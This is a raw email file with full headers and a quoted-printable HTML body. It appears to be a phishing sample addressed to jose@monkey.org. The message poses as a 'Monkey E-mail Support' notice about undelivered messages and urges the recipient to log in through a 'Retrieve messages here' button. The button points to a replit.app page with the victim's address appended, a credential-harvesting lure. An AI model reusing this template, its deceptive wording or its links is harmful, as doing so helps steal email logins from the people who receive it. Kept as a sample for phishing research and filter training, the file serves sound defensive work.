@@ -1,0 +1,144 @@
+Return-Path: infosysadmin@housing-jp.com
+Delivered-To: jose@monkey.org
+X-FDA: 82192290054.13.68351D3
+Received: from mail.housing-jp.com (mail.housing-jp.com [219.117.248.58])
+	by imf10.b.hostedemail.com (Postfix) with ESMTP id E1707A0002
+	for <jose@monkey.org>; Tue,  4 Jun 2024 06:53:25 +0000 (UTC)
+Authentication-Results: imf10.b.hostedemail.com;	dkim=pass
+ header.d=housing-jp.com header.s=default header.b=VSXJJAol;	dkim=pass
+ header.d=housing-jp.com header.s=default header.b=FuETt9bc;	spf=pass
+ (imf10.b.hostedemail.com: domain of infosysadmin@housing-jp.com designates
+ 219.117.248.58 as permitted sender)
+ smtp.mailfrom=infosysadmin@housing-jp.com;	dmarc=none
+ARC-Message-Signature: i=1; a=rsa-sha256; c=relaxed/relaxed;
+ d=hostedemail.com;	s=arc-20220608; t=1717484006;
+	h=from:from:sender:reply-to:subject:subject:date:date:	
+ message-id:message-id:to:to:cc:mime-version:mime-version:	
+ content-type:content-type:	
+ content-transfer-encoding:content-transfer-encoding:in-reply-to:	
+ references:dkim-signature; bh=s3grA4aZwyLwcpXdVJj4nYv8jr65otWsJw1ZNBd5aKg=;
+	b=VLIWvNqSTLQGpqae7pEsl+TKLQN0KV/KoYfk2hNhR2PW3rgvQyIDY8WCA7yn1bh2M/4Oe4
+	Mv2eQlm5P1BXnqRi6oK6cy6JAyPH22ESF22ThEnm2v6LGwvquE+b5CZgBmpRJQKXlDDGac
+	jED7NGQKTghSP8GpJ2uaqOWTqG0JYcc=
+ARC-Authentication-Results: i=1;	imf10.b.hostedemail.com;	dkim=pass
+ header.d=housing-jp.com header.s=default header.b=VSXJJAol;	dkim=pass
+ header.d=housing-jp.com header.s=default header.b=FuETt9bc;	spf=pass
+ (imf10.b.hostedemail.com: domain of infosysadmin@housing-jp.com designates
+ 219.117.248.58 as permitted sender)
+ smtp.mailfrom=infosysadmin@housing-jp.com;	dmarc=none
+ARC-Seal: i=1; s=arc-20220608; d=hostedemail.com; t=1717484006; a=rsa-sha256;
+	cv=none;
+	b=gE/jcCXNB58i5UvQ3PgMuhhnpxkwR0UiyZwoo5Z5eZGw2FrTqtqwbbPBNUAQ8lF+8LfuF9
+	9Ar1DWE/+SwlkD2LcfnLXckt0ZXLHwHLHfnjz1X9ipr5dAc/iwVTYW/Wkvf4cRsJh4JvoS
+	0z00P3LCEyf3CfW7C5JbKOTGETACol4=
+Received: from localhost (localhost [127.0.0.1])
+	by mail.housing-jp.com (Postfix) with ESMTP id 47D1E3C74F4
+	for <jose@monkey.org>; Mon,  3 Jun 2024 21:37:06 +0900 (JST)
+DKIM-Filter: OpenDKIM Filter v2.11.0 mail.housing-jp.com 47D1E3C74F4
+DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=housing-jp.com;
+	s=default; t=1717418227;
+	bh=s3grA4aZwyLwcpXdVJj4nYv8jr65otWsJw1ZNBd5aKg=;
+	h=From:To:Subject:Date:From;
+	b=VSXJJAolxxPJ53UEav0UQRCmwYiF6KcOq59dC87nSznxPstmuzSVEkR7J9b7i2qMC
+	 PZaO2YtnMJhIg71GIH2OxeHv0rkc3HHZLEl4RvFXpzGpdr+QUaximQ+JfcHGNL81ty
+	 7bd1P8t+oNAiMT4+gDq3zdH0LQnFpPOz+n5fkBZ4=
+X-Virus-Scanned: amavisd-new at housing-jp.com
+Received: from mail.housing-jp.com ([127.0.0.1])
+	by localhost (mail.housing-jp.com [127.0.0.1]) (amavisd-new, port 10024)
+	with ESMTP id POcAaJzpAq8E for <jose@monkey.org>;
+	Mon,  3 Jun 2024 21:37:05 +0900 (JST)
+Received: from [127.0.0.1] (unknown [185.161.210.44])
+	by mail.housing-jp.com (Postfix) with ESMTPSA id A9A761CD13F6
+	for <jose@monkey.org>; Mon,  3 Jun 2024 14:02:14 +0900 (JST)
+DKIM-Filter: OpenDKIM Filter v2.11.0 mail.housing-jp.com A9A761CD13F6
+DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=housing-jp.com;
+	s=default; t=1717390936;
+	bh=s3grA4aZwyLwcpXdVJj4nYv8jr65otWsJw1ZNBd5aKg=;
+	h=From:To:Subject:Date:From;
+	b=FuETt9bcG5Zjy85sZsq1MJ93Z8oFgYO92CDdHd09jOu4Y4rAI3KWG8dfxnZKngjwk
+	 sC5YIG2z1Gyg+BaJB6LeDXIo4LegfSPDuSdpbu4Xt17dN0Pl/j6keT5TW2SdG2B6gN
+	 lfYzKLCTDvxAxeTNvbvqo5EJ1QUbdqReb9xB2OsM=
+Content-Type: text/html
+From: "Administrator-Support Monkey PortalNotification"
+ <infosysadmin@housing-jp.com>
+To: jose@monkey.org
+Subject: Attention Required: You Have (8) Failed Messages on 2024-06-02
+Message-ID: <0497c1e1-44a7-9178-43a2-d608d51bbea1@housing-jp.com>
+Content-Transfer-Encoding: quoted-printable
+Date: Mon, 03 Jun 2024 05:02:12 +0000
+MIME-Version: 1.0
+X-Rspamd-Server: rspam12
+X-Rspamd-Queue-Id: E1707A0002
+X-Stat-Signature: aykodfd4prhup4a7kt3nmpp9d8b7x61i
+X-Rspam-User: 
+X-Spam-Status: No, score=1.31
+X-HE-Tag: 1717484005-43693
+X-HE-Meta: =?utf-8?q?U2FsdGVkX18PEEOfKrJzgBTEK54Ma9pWExaJ6CVIyXCeWUL+4ZOKRxy?=
+ =?utf-8?q?aTZwvKPtppGtc3lWZI/zMdU393YkYCfZyxwkERAnbqMbnqUaM/xW1jTBRE9PUlLYz?=
+ =?utf-8?q?FyCfHm6+F6h1dUEkBh54OU1q4MJVwyxQYgrXdrpMZmwhi1GOz52VQYw0VCCRoSJjg?=
+ =?utf-8?q?r8IzG7b0+NSWLsM6MUNsRpe96Td6THZTe3cAH5ORQuXkULVzI905Y1oNTUn1hcbm6?=
+ =?utf-8?q?Lk50b8e0u+Vq5Y3M0kwJBRo4/GinJOgarsfOQELg/eXRkmwPu1nNdSiQ/K4LCg4ji?=
+ =?utf-8?q?fniAU?=
+Status: O
+X-Status: 
+X-Keywords: 
+X-UID: 169
+
+<meta http-equiv=3D"X-UA-Compatible" content=3D"IE=3Dedge">
+<meta name=3D"GENERATOR" content=3D"MSHTML 11.00.10570.1001"></head>
+<body>
+<div class=3D"Ar Au Ao" id=3D":ny" style=3D"display: block;">
+<div tabindex=3D"1" class=3D"Am aiL Al editable LW-avf tS-tW tS-tY" =
+id=3D":o2" role=3D"textbox" aria-expanded=3D"false" aria-controls=3D":1vt" =
+aria-owns=3D":1vt" style=3D"direction: ltr; min-height: 246px;" =
+contenteditable=3D"true" hidefocus=3D"" spellcheck=3D"false" =
+aria-label=3D"Message Body" aria-multiline=3D"true" g_editable=3D"true">
+<div style=3D"box-sizing: border-box;"><span style=3D"font-weight: bolder; =
+box-sizing: border-box;"><font size=3D"5" style=3D"box-sizing: =
+border-box;"><font color=3D"#ff0000"></font><font color=3D"#002fa7">Undeliv=
+ered Email System</font><br style=3D"box-sizing: border-box;"></font></span=
+></div>
+<div style=3D"box-sizing: border-box;">
+<div style=3D"font-family: =
+arial,helvetica,sans-serif; box-sizing: border-box;">
+<p style=3D'margin: 0px 0px 1em; color: rgb(32, 31, 30); font-family: =
+-apple-system,BlinkMacSystemFont,"Helvetica Neue","Segoe UI",Arial,=
+sans-serif,"Apple Color Emoji","Segoe UI Emoji","Segoe UI Symbol"; =
+font-size: 15px; box-sizing: border-box;'><span style=3D"font-weight: =
+bolder; box-sizing: border-box;">Hello jose <br>(9) incomming Messages =
+failed to deliver to your inbox&nbsp; due to system&nbsp;delay!</span></p>
+<p style=3D'margin: 0px 0px 1em; color: rgb(32, 31, 30); font-family: =
+-apple-system,BlinkMacSystemFont,"Helvetica Neue","Segoe UI",Arial,=
+sans-serif,"Apple Color Emoji","Segoe UI Emoji","Segoe UI Symbol"; =
+font-size: 15px; box-sizing: border-box;'>follow below link to login to =
+your email portal&nbsp;to retrieve to deliver your messages below.</p>
+<table style=3D'color: rgb(32, 31, 30); font-family: -apple-system,=
+BlinkMacSystemFont,"Helvetica Neue","Segoe UI",Arial,sans-serif,"Apple =
+Color Emoji","Segoe UI Emoji","Segoe UI Symbol"; font-size: 15px; =
+border-collapse: collapse; font-feature-settings: "liga" 0;' border=3D"0" =
+cellspacing=3D"0" cellpadding=3D"0">
+<tbody style=3D"box-sizing: =
+border-box;">
+<tr style=3D"box-sizing: border-box;">
+<td style=3D'padding: 10px 16px; color: rgb(255, 255, 255); line-height: =
+16px; font-family: "segoe ui semibold","segoe ui",suwsb,arial,sans-serif; =
+font-size: 8px; vertical-align: middle; box-sizing: border-box;' =
+bgcolor=3D"#ff0000" rowspan=3D"3"><font color=3D"#ffffff" face=3D"Segoe UI =
+Semibold" size=3D"3" style=3D"box-sizing: border-box;">
+<a style=3D"margin: 0px; padding: 0px; color: rgb(255, 255, 255); =
+vertical-align: baseline; box-sizing: border-box; background-color: rgb(255=
+, 0, 0); text-decoration-line: none;" href=3D"https://html-buggyman.replit.=
+app/#jose@monkey.org" target=3D"_blank" rel=3D"noreferrer"=20
+data-saferedirecturl=3D"https://www.google.com/url?q=3Dhttps://saintyourpro=
+blemtoomuch-pawanbhagchanda.replit.app/%23%5B%5B-Email-%5D%5D&amp;source=3D=
+gmail&amp;ust=3D1710240187139000&amp;usg=3DAOvVaw0kFRjfUEEBsaey2NEx1AbP">Re=
+trieve messages here</a></font></td></tr></tbody></table></div>
+<div style=3D"font-family: arial,helvetica,sans-serif; box-sizing: =
+border-box;"><br style=3D"box-sizing: border-box;"></div>
+<div style=3D"font-family: arial,helvetica,sans-serif; box-sizing: =
+border-box;">&copy; 2024 | |&nbsp;<a href=3D"http://ingenious-medical.com/"=
+ target=3D"_blank" data-saferedirecturl=3D"https://www.google.com/url?=
+q=3Dhttp://ingenious-medical.com/&amp;source=3Dgmail&amp;ust=3D171024018713=
+9000&amp;usg=3DAOvVaw2SZ9oT6v69MNda-J6OMKul">Monkey</a>&nbsp;E-mail =
+Support</div></div></div></div></body></html>
+
